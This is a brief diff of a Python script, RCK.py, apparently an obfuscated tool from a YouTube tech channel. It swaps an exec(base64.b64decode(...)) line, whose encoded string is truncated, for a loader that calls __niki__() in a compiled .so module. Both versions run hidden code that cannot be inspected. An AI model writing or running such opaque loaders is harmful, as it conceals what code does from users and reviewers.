@@ -1,6 +1,6 @@
-GNU nano 6.3                 RCK.py
-# #ENCODE_BY_QAISER_YT_TECH_QAISER
-
-
-import base64
-exec(base64.b64decode('IyBEZWNvbXBpbGUgYnkgTWFyZGlzIChUb29scyBC>
+import os, sys, time
+from time import sleep
+try:
+    __import__('RCK.cpython-310.so').__niki__()
+except Exception as e:
+    exit(str(e))
